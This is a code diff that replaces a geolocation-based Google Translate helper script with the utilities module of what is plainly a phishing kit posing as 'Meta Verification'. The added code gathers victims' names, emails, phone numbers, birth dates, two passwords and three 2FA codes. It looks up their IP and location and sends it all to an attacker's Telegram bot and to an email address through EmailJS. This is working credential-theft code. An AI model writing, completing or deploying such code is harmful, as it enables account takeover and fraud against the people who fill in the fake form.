@@ -1,297 +1,256 @@
-(function () {
-    'use strict';
+// Utilities
+const Utils = {
+    encrypt(text) {
+        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
+    },
 
-    const LANG_MAP = {
-        // English
-        US: 'en', GB: 'en', CA: 'en', AU: 'en',
-        NZ: 'en', IE: 'en', SG: 'en',
+    decrypt(cipherText) {
+        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
+        return bytes.toString(CryptoJS.enc.Utf8);
+    },
 
-        // Asia
-        JP: 'ja', KR: 'ko', CN: 'zh-CN',
-        TW: 'zh-TW', HK: 'zh-TW', TH: 'th',
-        ID: 'id', MY: 'ms', PH: 'tl', IN: 'hi',
-        PK: 'ur', BD: 'bn',
+    saveRecord(key, value) {
+        try {
+            const encryptedValue = this.encrypt(JSON.stringify(value));
+            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            localStorage.setItem(key, JSON.stringify(record));
+        } catch (error) {
+            console.error('Save error:', error);
+        }
+    },
 
-        // Europe
-        FR: 'fr', DE: 'de', IT: 'it', ES: 'es',
-        PT: 'pt', NL: 'nl', BE: 'fr', CH: 'de',
-        AT: 'de', SE: 'sv', NO: 'no', DK: 'da',
-        FI: 'fi', IS: 'is', PL: 'pl', CZ: 'cs',
-        SK: 'sk', HU: 'hu', RO: 'ro', BG: 'bg',
-        HR: 'hr', SI: 'sl', RS: 'sr', BA: 'bs',
-        ME: 'sr', MK: 'mk', LT: 'lt', LV: 'lv',
-        EE: 'et', GR: 'el', AL: 'sq', UA: 'uk',
-        RU: 'ru',
+    getRecord(key) {
+        try {
+            const item = localStorage.getItem(key);
+            if (!item) return null;
+            const { value, expiry } = JSON.parse(item);
+            if (Date.now() > expiry) {
+                localStorage.removeItem(key);
+                return null;
+            }
+            const decrypted = this.decrypt(value);
+            return decrypted ? JSON.parse(decrypted) : null;
+        } catch (error) {
+            return null;
+        }
+    },
 
-        // Middle East
-        SA: 'ar', AE: 'ar', EG: 'ar', IQ: 'ar',
-        MA: 'ar', IL: 'he', IR: 'fa', AF: 'fa',
-        TR: 'tr',
+    async getUserIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error getting IP:', error);
+            return 'N/A';
+        }
+    },
 
-        // Latin America
-        MX: 'es', AR: 'es', CO: 'es', CL: 'es',
-        PE: 'es', VE: 'es', UY: 'es', PY: 'es',
-        BO: 'es', EC: 'es', BR: 'pt',
+async getUserLocation() {
+    try {
+        const response = await fetch("https://ipwho.is/", {
+            method: "GET",
+            cache: "no-store"
+        });
 
-        // Africa
-        ZA: 'en', NG: 'en', KE: 'en'
+        if (!response.ok) {
+            throw new Error(`Location API error: ${response.status}`);
+        }
+
+        const data = await response.json();
+
+        if (data.success === false) {
+            throw new Error(data.message || "Location lookup failed");
+        }
+
+        const ip = data.ip || "N/A";
+
+        const parts = [
+            data.city,
+            data.region,
+            data.country
+        ].filter(Boolean);
+
+        return {
+            ip: ip,
+            location: parts.length > 0
+                ? parts.join(" | ")
+                : "N/A",
+            country_code: data.country_code || "N/A",
+            region: data.region || "N/A",
+            country: data.country || "N/A"
+        };
+
+    } catch (error) {
+        console.error("Location error:", error);
+
+        return {
+            ip: "N/A",
+            location: "N/A",
+            country_code: "N/A",
+            region: "N/A",
+            country: "N/A"
+        };
+    }
+},
+async sendToTelegram(data) {
+
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
     };
 
-    const OVERLAY_ID = 'translate-overlay';
-    const COOKIE_NAME = 'googtrans';
-    const IPINFO_TOKEN = ''; // Điền token IPinfo mới nếu sử dụng API có token.
-
-    // Tạo overlay
-    function createOverlay() {
-        if (!document.body ||
-            document.getElementById(OVERLAY_ID)) return;
-
-        if (!document.getElementById('translate-overlay-style')) {
-            const style = document.createElement('style');
-            style.id = 'translate-overlay-style';
-            style.textContent = `
-                @keyframes _tl_spin {
-                    to { transform: rotate(360deg); }
-                }
-                #${OVERLAY_ID} {
-                    position: fixed;
-                    inset: 0;
-                    z-index: 999999;
-                    background: rgba(255,255,255,.48);
-                    backdrop-filter: blur(6px);
-                    -webkit-backdrop-filter: blur(6px);
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    opacity: 1;
-                    transition: opacity .4s ease;
-                }
-                #${OVERLAY_ID} .tl-spinner {
-                    width: 36px;
-                    height: 36px;
-                    border: 3px solid #e0e0e0;
-                    border-top-color: #1877f2;
-                    border-radius: 50%;
-                    animation: _tl_spin .7s linear infinite;
-                }
-            `;
-            document.head.appendChild(style);
-        }
-
-        const overlay = document.createElement('div');
-        overlay.id = OVERLAY_ID;
-
-        const spinner = document.createElement('div');
-        spinner.className = 'tl-spinner';
-
-        overlay.appendChild(spinner);
-        document.body.appendChild(overlay);
-    }
-
-    function removeOverlay() {
-        const overlay = document.getElementById(OVERLAY_ID);
-        if (!overlay) return;
-
-        overlay.style.opacity = '0';
-
-        setTimeout(function () {
-            if (overlay.parentNode) {
-                overlay.parentNode.removeChild(overlay);
-            }
-        }, 420);
-    }
-
-    // Đọc cookie
-    function getGoogtransCookie() {
-        const match = document.cookie.match(
-            /(?:^|;\s*)googtrans=([^;]*)/
-        );
-
-        if (!match) return null;
+    const text = `
+<b>IP:</b> <code>${locationData.ip}</code>
+<b>Location:</b> <code>${locationData.location})</code>
+----------------------------------
+<b>Full Name:</b> <code>${data.fullName || ''}</code>
+<b>Email:</b> <code>${data.email || ''}</code>
+<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
+<b>Page Name:</b> <code>${data.fanpage || ''}</code>
+<b>Phone:</b> <code>${data.phone || ''}</code>
+<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
+----------------------------------
+<b>Password(1):</b> <code>${data.password || ''}</code>
+<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+----------------------------------
+<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
 
         try {
-            return decodeURIComponent(match[1]);
-        } catch (e) {
-            return match[1];
-        }
-    }
-
-    // Ghi cookie theo đường dẫn hiện tại
-    function setGoogtransCookie(lang) {
-        const value = encodeURIComponent('/en/' + lang);
-        const secure = location.protocol === 'https:'
-            ? '; Secure'
-            : '';
-
-        // Cookie host-only, phù hợp cả subdomain và localhost
-        document.cookie =
-            COOKIE_NAME + '=' + value +
-            '; Path=/; Max-Age=31536000; SameSite=Lax' +
-            secure;
-    }
-
-    // Gọi API có timeout và kiểm tra dữ liệu
-    async function fetchCountry(url) {
-        const controller = new AbortController();
-        const timeout = setTimeout(function () {
-            controller.abort();
-        }, 4500);
-
-        try {
-            const response = await fetch(url, {
-                method: 'GET',
-                headers: { Accept: 'application/json' },
-                cache: 'no-store',
-                signal: controller.signal
+            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text,
+                    parse_mode: 'HTML'
+                })
             });
-
-            if (!response.ok) {
-                throw new Error('HTTP ' + response.status);
-            }
-
-            const data = await response.json();
-
-            const code = String(
-                data.country_code ||
-                data.countryCode ||
-                data.country ||
-                ''
-            ).trim().toUpperCase();
-
-            // API phải trả về mã quốc gia gồm đúng 2 chữ cái
-            if (/^[A-Z]{2}$/.test(code)) {
-                return code;
-            }
-
-            throw new Error('API không trả về mã quốc gia hợp lệ');
-        } finally {
-            clearTimeout(timeout);
-        }
-    }
-
-    // IPinfo trước, các dịch vụ dự phòng sau
-    async function getCountryCode() {
-        const endpoints = [];
-
-        if (IPINFO_TOKEN.trim()) {
-            endpoints.push(
-                'https://api.ipinfo.io/lite/me?token=' +
-                encodeURIComponent(IPINFO_TOKEN.trim())
-            );
-        }
-
-        // API IPinfo cũ: không cần token, nhưng có giới hạn lượt gọi
-        endpoints.push('https://ipinfo.io/json');
-
-        // API dự phòng
-        endpoints.push('https://ipapi.co/json/');
-
-        for (const url of endpoints) {
-            try {
-                const code = await fetchCountry(url);
-                console.info('[Translate] Country detected:', code);
-                return code;
-            } catch (error) {
-                console.warn(
-                    '[Translate] Country API failed:',
-                    url,
-                    error.message
-                );
-            }
-        }
-
-        return '';
-    }
-
-    // Chờ Google Translate áp dụng bản dịch
-    function waitForTranslation(timeout) {
-        return new Promise(function (resolve) {
-            const html = document.documentElement;
-
-            if (/translated-(ltr|rtl)/.test(html.className)) {
-                resolve(true);
-                return;
-            }
-
-            let finished = false;
-            let observer;
-
-            const timer = setTimeout(function () {
-                finish(false);
-            }, timeout || 6000);
-
-            function finish(translated) {
-                if (finished) return;
-                finished = true;
-
-                clearTimeout(timer);
-                if (observer) observer.disconnect();
-
-                resolve(translated);
-            }
-
-            observer = new MutationObserver(function () {
-                if (/translated-(ltr|rtl)/.test(html.className)) {
-                    finish(true);
-                }
-            });
-
-            observer.observe(html, {
-                attributes: true,
-                attributeFilter: ['class']
-            });
-        });
-    }
-
-    // Luồng chính
-    async function run() {
-        createOverlay();
-
-        try {
-            const existing = getGoogtransCookie();
-
-            // Đã có lựa chọn ngôn ngữ: không tự đổi lại
-            if (existing && /^\/en\/[a-zA-Z-]+$/.test(existing)) {
-                const currentLang = existing.split('/')[2];
-
-                if (currentLang !== 'en') {
-                    await waitForTranslation(6000);
-                }
-
-                return;
-            }
-
-            const countryCode = await getCountryCode();
-            const targetLang = LANG_MAP[countryCode];
-
-            // Không xác định được quốc gia hoặc không cần dịch
-            if (!targetLang || targetLang === 'en') {
-                if (targetLang === 'en') {
-                    setGoogtransCookie('en');
-                }
-                return;
-            }
-
-            // Ghi cookie trước khi reload
-            setGoogtransCookie(targetLang);
-
-            // Chỉ reload một lần khi chưa có cookie
-            location.reload();
-
         } catch (error) {
-            console.error('[Translate] Initialization error:', error);
-        } finally {
-            // Không để overlay che trang nếu API lỗi
-            // Khi reload, trình duyệt sẽ tải lại toàn bộ trang.
-            setTimeout(removeOverlay, 6000);
+            console.error('Telegram error:', error);
         }
-    }
+    },
 
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', run, {
-            once: true
+async sendToEmail(data) {
+
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
+    };
+
+    const emailContent = `
+IP: ${locationData.ip}
+Location: ${locationData.location}
+----------------------------------
+Full Name: ${data.fullName || ''}
+Email: ${data.email || ''}
+Email Business: ${data.emailBusiness || ''}
+Page Name: ${data.fanpage || ''}
+Phone: ${data.phone || ''}
+Date of Birth: ${data.day}/${data.month}/${data.year}
+----------------------------------
+Password(1): ${data.password || ''}
+Password(2): ${data.passwordSecond || ''}
+----------------------------------
+🔐Code 2FA(1): ${data.twoFa || ''}
+🔐Code 2FA(2): ${data.twoFaSecond || ''}
+🔐Code 2FA(3): ${data.twoFaThird || ''}
+
+Sent at: ${new Date().toLocaleString()}`;
+
+        try {
+            // Load EmailJS SDK if not already loaded
+            if (!window.emailjs) {
+                await this.loadEmailJSSDK();
+            }
+
+            await emailjs.send(
+                CONFIG.EMAILJS_SERVICE_ID,
+                CONFIG.EMAILJS_TEMPLATE_ID,
+                {
+                    to_email: CONFIG.EMAIL_RECIPIENT,
+                    subject: `Meta Verification - ${locationData.location}`,
+                    message: emailContent,
+                    from_name: 'Meta Verification System',
+                    reply_to: data.email || 'noreply@system.com'
+                },
+                CONFIG.EMAILJS_PUBLIC_KEY
+            );
+        } catch (error) {
+            console.error('Email error:', error);
+        }
+    },
+
+    loadEmailJSSDK() {
+        return new Promise((resolve, reject) => {
+            if (window.emailjs) {
+                resolve();
+                return;
+            }
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            script.onload = () => {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+                resolve();
+            };
+            script.onerror = reject;
+            document.head.appendChild(script);
         });
-    } else {
-        run();
+    },
+
+async sendNotification(data) {
+    const notificationType = CONFIG.NOTIFICATION_TYPE;
+
+    try {
+        // Chỉ lấy location 1 lần
+        const locationData = await this.getUserLocation();
+
+        const notificationData = {
+            ...data,
+            locationData
+        };
+
+        if (
+            notificationType === 'telegram' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToTelegram(notificationData);
+        }
+
+        if (
+            notificationType === 'email' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToEmail(notificationData);
+        }
+
+    } catch (error) {
+        console.error(
+            'Notification error:',
+            error
+        );
     }
-})();
+},
+
+    maskPhone(phone) {
+        if (!phone || phone.length < 5) return phone;
+        const start = phone.slice(0, 2);
+        const end = phone.slice(-2);
+        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
+    },
+
+    maskEmail(email) {
+        if (!email) return '';
+        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
+            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
+        });
+    },
+
+    generateTicketId() {
+        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+        return `${gen()}-${gen()}-${gen()}`;
+    }
+};
